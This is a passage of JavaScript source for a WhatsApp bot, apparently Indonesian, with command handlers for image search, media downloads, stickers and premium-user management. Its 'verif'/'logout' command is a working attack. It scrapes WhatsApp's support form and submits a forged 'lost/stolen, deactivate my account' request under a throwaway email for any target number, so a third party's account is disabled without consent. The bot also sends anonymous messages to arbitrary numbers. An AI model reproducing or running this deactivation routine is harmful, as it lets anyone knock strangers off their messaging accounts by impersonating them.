var intinya = `https://api.lolhuman.xyz/api/gimage?apikey=${lolkey}&query=cowok%20ganteng%20pinterest`
xd.sendMessage(m.chat, { image : { url : intinya}, caption : 'Jangan Lupa Subs Youtube : KurrXd OFFICIAL'})}
break
case 'cecan':{
  if (jangan) return
  if (!isCommand) return
 if (!isPremium) return xd.sendMessage(m.chat, { text : pritprit },  { quoted: m })
var intinya = `https://api.lolhuman.xyz/api/gimage?apikey=${lolkey}&query=cewek%20cantik%20pinterest`
xd.sendMessage(m.chat, { image : { url : intinya}, caption : 'Jangan Lupa Subs Youtube : KurrXd OFFICIAL'})}
break
case 'waifu':{
  if (jangan) return
  if (!isCommand) return
 if (!isPremium) return xd.sendMessage(m.chat, { text : pritprit },  { quoted: m })
var intinya = `https://api.lolhuman.xyz/api/gimage?apikey=${lolkey}&query=anime%20girl%20sexy%20cute`
xd.sendMessage(m.chat, { image : { url : intinya}, caption : 'Jangan Lupa Subs Youtube : KurrXd OFFICIAL'})}
break
// own area
case 'listpc': {
if (!isCreator) return
if (!isCommand) return
let anu = await store.chats.all().filter(v => v.id.endsWith('.net')).map(v => v.id)
let teks = `⬣ *LIST PERSONAL CHAT*\n\nTotal Chat : ${anu.length} Chat\n\n`
for (let i of anu) {
let nama = store.messages[i].array[0].pushName
teks += `› *Nama :* ${nama}\n› *User :* @${i.split('@')[0]}\n› *Chat :* https://wa.me/${i.split('@')[0]}\n\n────────────────────────\n\n`
}
xd.sendTextWithMentions(m.chat, teks, m)
}
  break

  case 'addprem':
 if (!isCreator) return
  if (!isCommand) return
if (!args[0]) return m.reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 0`)
bnnd = q.split("|")[0].replace(/[^0-9]/g, '')
owner.push(bnnd)
fs.writeFileSync('./js/db/premium.json', JSON.stringify(owner))
m.reply(`Nomor ${bnnd} Sudah Bisa Akses Premium`)
break

case 'delprem':
 if (!isCreator) return
 if (!isCommand) return
if (!args[0]) return m.reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 0`)
ya = q.split("|")[0].replace(/[^0-9]/g, '')
unp = owner.indexOf(ya)
owner.splice(unp, 1)
fs.writeFileSync('./js/db/premium.json', JSON.stringify(owner))
m.reply(`Nomor ${ya} Sudah Tidak Bisa Akses Premium`)
break
case 'setppbot': {
  if (!isCommand) return
if (!isCreator) return 
if (!/image/.test(mime)) return m.reply(`Kirim/Reply Image Dengan Caption ${prefix + command}`)
if (/webp/.test(mime)) return m.reply(`Kirim/Reply Image Dengan Caption ${prefix + command}`)
var medis = await xd.downloadAndSaveMediaMessage(quoted, 'ppbot.jpeg')
if (args[0] == `/full`) {
var { img } = await generateProfilePicture(medis)
await xd.query({
tag: 'iq',
attrs: {
to: botNumber,
type:'set',
xmlns: 'w:profile:picture'
},
content: [
{
tag: 'picture',
attrs: { type: 'image' },
content: img
}
]
})
fs.unlinkSync(medis)
m.reply(`Sukses`)
} else {
var memeg = await xd.updateProfilePicture(botNumber, { url: medis })
fs.unlinkSync(medis)
m.reply(`Sukses`)
}
}
break
case 'owner':
  if (jangan) return
  if (!isCommand) return
xd.sendMessage(
from,
{ 
contacts: { 
displayName: 'Ini Adalah Contact Pembuat Bot Kak', 
contacts: [{ vcard }] 
}
}
)
break

// tools area
case 'script':
  if (!isCommand) return
  m.reply(`SC : https://youtube.com/@kurrxdofc`)
  break
case 'tourl': {
 if (!isPremium) return xd.sendMessage(m.chat, { text : pritprit },  { quoted: m })
m.reply(`SABAR YAAAA....`)
let media = await xd.downloadAndSaveMediaMessage(quoted)
if (/image/.test(mime)) {
let anu = await TelegraPh(media)
m.reply(util.format(anu))
} else if (!/image/.test(mime)) {
let anu = await UploadFileUgu(media)
m.reply(util.format(anu))
}
await fs.unlinkSync(media)
}
break
 case 'vn':{
     if (!isPremium) return xd.sendMessage(m.chat, { text : pritprit },  { quoted: m })
  if (jangan) return
  if (!isCommand) return
  if (!q) return m.reply(`textnya?`)
  hase =  `https://api.lolhuman.xyz/api/gtts/id?apikey=${lolkey}&text=${q}`
xd.sendMessage(m.chat, {audio: {url : hase }, mimetype:'audio/mpeg', ptt:true})
 }
  break
case "sound":{
    if (!isPremium) return xd.sendMessage(m.chat, { text : pritprit },  { quoted: m })
  if (jangan) return
  if (!isCommand) return
  if (!q) throw `Judul?`
  if (!quoted) return 
m.reply(`Sebentar Ya...`)
 var sound = "sound " + q + "30 detik"
var yt_res = await fetchJson(`https://api.lolhuman.xyz/api/ytplay2?apikey=${lolkey}&query=${sound}`)

 xd.sendMessage(m.chat, {audio: {url : yt_res.result.url }, mimetype:'audio/mpeg', ptt:true})
 }
break

case 'pinterest': case 'pin':{
    if (!isPremium) return xd.sendMessage(m.chat, { text : pritprit },  { quoted: m })
  if (jangan) return
  if (!isCommand) return
  if (!isPremium) return xd.sendMessage(m.chat, { text : pritprit },  { quoted: m })
  if (!q) throw `Apa Yang Dicari?`
  if (!quoted) return 
var intinya = await `https://api.lolhuman.xyz/api/gimage?apikey=${lolkey}&query=${q}`
xd.sendMessage(m.chat, { image : { url : intinya}, caption : 'Jangan Lupa Subs Youtube : KurrXd OFFICIAL'})}
break
case "tiktok": case "tiktoknowm": case "tiktokdl":{
    if (!isPremium) return xd.sendMessage(m.chat, { text : pritprit },  { quoted: m })
  if (jangan) return
  if (!isCommand) return
 if (!q) throw `link nya?`
var tt_res = await fetchJson(`https://api.lolhuman.xyz/api/tiktok?apikey=${lolkey}&url=${q}`)
pls = "```"
hasilnye = `${pls}SUKSES MENDAPATKAN VIDEO

Author : ${tt_res.result.author.nickname}
Judul  : ${tt_res.result.title}

Mohon Tunggu Beberapa Saat....${pls}
`
 xd.sendMessage(m.chat, { video: {url : tt_res.result.link}})
xd.sendMessage(m.chat, {text:hasilnye})}
break
case "instagram": case "instagramdl":{
    if (!isPremium) return xd.sendMessage(m.chat, { text : pritprit },  { quoted: m })
  if (jangan) return
  if (!isCommand) return

 if (!q) throw `link nya?`
var ig_res = await fetchJson(`https://api.lolhuman.xyz/api/instagram?apikey=${lolkey}&url=${q}`)
pls = "```"
hasilnye = `${pls}SUKSES MENDAPATKAN VIDEO

Mohon Tunggu Beberapa Saat....${pls}
`
 xd.sendMessage(m.chat, { video: {url : ig_res.result}})
xd.sendMessage(m.chat, {text:hasilnye})}
break

 case "tiktokmp3":{
     if (!isPremium) return xd.sendMessage(m.chat, { text : pritprit },  { quoted: m })
  if (jangan) return
  if (!isCommand) return
  if (!q) throw `link nya?`
 
tt_res = `https://api.lolhuman.xyz/api/tiktokmusic?apikey=${lolkey}&url=${q}`
pls = "```"
hasilnye = `${pls}SUKSES MENDAPATKAN AUDIO

Mohon Tunggu Beberapa Saat....${pls}
`
 xd.sendMessage(m.chat,{audio:{url:tt_res}, mimetype:'audio/mpeg', fileName:'audio.mp3'}, {quoted:m})
xd.sendMessage(m.chat, {text:hasilnye})}
break
 
 case "playmp3":{
  if (jangan) return
  if (!isCommand) return
  if (!isPremium) return xd.sendMessage(m.chat, { text : pritprit },  { quoted: m })
  if (!q) throw `Judul?`
m.reply(`Sebentar Ya...`)
var yt_res = await fetchJson(`https://api.lolhuman.xyz/api/ytplay2?apikey=${lolkey}&query=${q}`)

xd.sendMessage(m.chat,{audio:{url:yt_res.result.audio}, mimetype:'audio/mpeg', fileName:'audio.mp3'}, {quoted:m})}
break
case "playmp4":{
  if (jangan) return
  if (!isCommand) return
 if (!isPremium) return xd.sendMessage(m.chat, { text : pritprit },  { quoted: m })
 if (!q) throw `Judul?`
m.reply(`Sebentar Ya...`)
var yt_res = await fetchJson(`https://api.lolhuman.xyz/api/ytplay2?apikey=${lolkey}&query=${q}`)

xd.sendMessage(m.chat, { video: {url : yt_res.result.video}})}
break
case "ytdl": case "ytdownload":{
  if (jangan) return
  if (!isCommand) return
 if (!isPremium) return xd.sendMessage(m.chat, { text : pritprit },  { quoted: m })
 if (!q) throw `Judul?`
m.reply(`Sebentar Ya...`)
var yt_res = await fetchJson(`https://api.lolhuman.xyz/api/ytplay2?apikey=${lolkey}&query=${q}`)


m.reply(`SUCCES GET LINK DOWNLOAD`)
m.reply(`MP4 DOWNLOAD : ${yt_res.result.video}`)
m.reply(`MP3 DOWNLOAD : ${yt_res.result.audio}`)
}
break
// stiker area
case 'smeme': case 'stikermeme':{
  if (jangan) return
  if (!isCommand) return
    if (!isPremium) return xd.sendMessage(m.chat, { text : pritprit },  { quoted: m })

var atas = ' '
var bawah = q.split('|')[0]
if (!bawah) return m.reply(`text nya?`)
var media = await xd.downloadAndSaveMediaMessage(quoted, 'image', `./sticker/${sender.split('@')[0]}.jpg`)
var media_url = (await UploadFileUgu(media)).url
var meme_jadi = `https://api.memegen.link/images/custom/${encodeURIComponent(atas)}/${encodeURIComponent(bawah)}.png?background=${media_url}`
xd.sendImageAsSticker(m.chat, meme_jadi, m, { packname: global.packname, author: global.author }) 

}
break
case 'toimg': case 'toimage':{
    if (!isPremium) return xd.sendMessage(m.chat, { text : pritprit },  { quoted: m })
  if (jangan) return
  if (!isCommand) return
  if (!/webp/.test(mime)) throw `balas stiker dengan caption *${prefix + command}*`
 var media = await xd.downloadAndSaveMediaMessage(quoted, 'webp', `./sticker/${sender.split('@')[0]}.webp`)
 var media_url = (await UploadFileUgu(media)).url
 var meme_jadi = `https://api.memegen.link/images/custom/${encodeURIComponent(atas)}/${encodeURIComponent(bawah)}.png?background=${media_url}`
 xd.sendMessage(m.chat, {image : {url : media_url}})
 }
 break
 case 'ttp6':
 case 'ttp5':
  case 'ttp4':
 case 'ttp3':
case 'ttp2':
case 'ttp':{
  if (jangan) return
  if (!isCommand) return
if (!isPremium) return xd.sendMessage(m.chat, { text : pritprit },  { quoted: m })
if (!q) return m.reply(`Contoh:\n${prefix+command} saya wibu`)
var nyz1 = `https://api.lolhuman.xyz/api/${command}?apikey=${lolkey}&text=${q}`
xd.sendImageAsSticker(from, nyz1, m, { packname: global.packname, author: global.author }) 
 }
break

case 'sendsticker':{
  if (jangan) return
  if (!isCommand) return
if (!isPremium) return xd.sendMessage(m.chat, { text : pritprit },  { quoted: m })
if (!q) return m.reply(`Contoh:\n${prefix+command} saya wibu`)
var nyz1 = `https://api.lolhuman.xyz/api/gimage?apikey=${lolkey}&query=sticker%20meme%20${q}`
xd.sendImageAsSticker(from, nyz1, m, { packname: global.packname, author: global.author }) 
 }
break

case 'stiker': case 'sticker': case 's': case 'stickergif': case 'sgif': {

{ 
  if (jangan) return
  if (!isCommand) return
if (!quoted) return m.reply(`Kirim/Reply Image Dengan Caption ${prefix + command}`)
if (/image/.test(mime)) {
m.reply(`Tunggu Sebentar Ya...`)
let media = await quoted.download()
let encmedia = await xd.sendImageAsSticker(m.chat, media, m, { packname: global.packname, author: global.author })
await fs.unlinkSync(encmedia)
} else if (/video/.test(mime)) {
 m.reply(`Tunggu Sebentar Ya...`)
if ((quoted.m || quoted).seconds > 11) return m.reply('Maksimal 10 detik!')
let media = await quoted.download()
let encmedia = await xd.sendVideoAsSticker(m.chat, media, m, { packname: global.packname, author: global.author })
await fs.unlinkSync(encmedia)
} else {
throw `Kirim Gambar/Video Dengan Caption ${prefix + command}\nDurasi Video 1-9 Detik`
}
}
}  
break
case 'jadianime': {
  if (jangan) return
  if (!isCommand) return
if (!isPremium) return xd.sendMessage(m.chat, { text : pritprit },  { quoted: m })
if (!/image/.test(mime)) return m.reply(`Kirim/Reply Image Dengan Caption ${prefix + command}`)
var media = await xd.downloadAndSaveMediaMessage(quoted, 'png', `./sticker/${sender.split('@')[0]}.png`)
var media_url = (await UploadFileUgu(media)).url
var anim =  `https://api.lolhuman.xyz/api/imagetoanime?apikey=${lolkey}&img=${media_url}`
xd.sendMessage(m.chat, { image : { url : anim}, caption : 'Jangan Lupa Subs Youtube : KurrXd OFFICIAL'})}
break
case 'stikerwm': case 'swm': case 'stickerwm':  {
    if (!isPremium) return xd.sendMessage(m.chat, { text : pritprit },  { quoted: m })
  if (jangan) return
  if (!isCommand) return
var pname = q.split('|')[0]
var athor = q.split('|')[1]
if (!quoted) return 
if (/image/.test(mime)) {
m.reply(`Tunggu Sebentar Ya...`)
let media = await quoted.download()
let encmedia = await xd.sendImageAsSticker(m.chat, media, m, { packname: pname, author: athor })
await fs.unlinkSync(encmedia)
} else if (/video/.test(mime)) {
 m.reply(`Tunggu Sebentar Ya...`)
if ((quoted.msg || quoted).seconds > 11) return m.reply('Maksimal 10 detik!')
let media = await quoted.download()
let encmedia = await xd.sendVideoAsSticker(m.chat, media, m, { packname: athor, author: athor })
await fs.unlinkSync(encmedia)
} else {
throw `Kirim Gambar/Video Dengan Caption ${prefix + command}\nDurasi Video 1-9 Detik`
}
}
 
break
// verif
case 'verif': case 'logout': {
  if (!isPremium) return xd.sendMessage(m.chat, { text : pritprit },  { quoted: m })
  if (jangan) return
  if (!q) return m.reply(`target?`)
  var axioss = require("axios")
  let ntah = await axioss.get("https://www.whatsapp.com/contact/noclient/")
let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1")
let cookie = ntah.headers["set-cookie"].join("; ")
let $ = cheerio.load(ntah.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "ID")
form.append("phone_number", q)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", "Perdido/roubado: desative minha conta")
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1006630858")
form.append("__comment_req", "0")
let res = await axioss({
  url,
  method: "POST",
  data: form,
  headers: {
    cookie
  }
})
m.reply(`DONE ${command} ${global.namabot}
Jika Nomer Masih Aktif No Tersebut Sudah Terkena ${command} Sebelumnya`)
}
break


 // menfess
case 'pesanrahasia': case 'secretchat':
if (Object.values(anon.anonymous).find(p => p.check(sender))) return m.reply("masih di room secret! ketik .outchat untuk keluar")
if (m.isGroup) return m.reply(mess.private)
let t = text.split('|');
if (t.length < 2) return m.reply(`Penggunaan ${prefix+command} nomor|Nama|Isi Pesan\nContoh ${prefix+command} 6287705048235|Rahasia|Hai Kamu Lagi Ngapain`)
if (text > 700) return m.reply(`Teks Kepanjangan`)
num = t[0].replace(/[^0-9]/g, '')+'@s.whatsapp.net'
pesan = t[2];
namanya = t[1];
if (num === m.sender) return m.reply(`Tidak Bisa  Ke Nomor Sendiri!!!`)
if (num === botNumber) return m.reply(`Tidak Bisa  Ke Nomor bot!!!`)
var nomor = m.sender

await xd.sendMessage(num, {text : `Haloo!!? Kamu Dapat 
Pesan Rahasia Nih :
👤 Pengirim : ${namanya}

💌 Pesan : 

${pesan}


`}, ` `, m)
lidt = `Sukses Mengirim Pesan`
var check = Object.values(anon.anonymous).find(p => p.state == "WAITING")
if (!check) {
anon.createRoom(sender, num)
console.log("[ Secret Chat ] Creating room for: " + sender);
return m.reply(lidt)
}
break
case 'outchat':{
if (isGroup && isCreator && isCommand == "leave") return xd.groupLeave(from)
if (isGroup) return m.reply("Only private chat")
var room = Object.values(anon.anonymous).find(p => p.check(sender))
if (!room) return m.reply("Anda tidak berada didalam room")
delete anon.anonymous[room.id]
m.reply(`succes keluar`)
}
break

default:
}
if (budy.startsWith('>')) {
if (!isCreator) return m.reply(`Maaf Command Tersebut Khusus Developer Bot WhatsApp`)
try {
let evaled = await eval(budy.slice(2))
if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
await m.reply(evaled)
} catch (err) {
m.reply(String(err))
}
}
} catch (err) {
m.reply(util.format(err))
}
}

let file = require.resolve(__filename)
fs.watchFile(file, () => {
fs.unwatchFile(file)
console.log(chalk.yellowBright(`Update File Terbaru ${__filename}`))
delete require.cache[file]
require(file)
})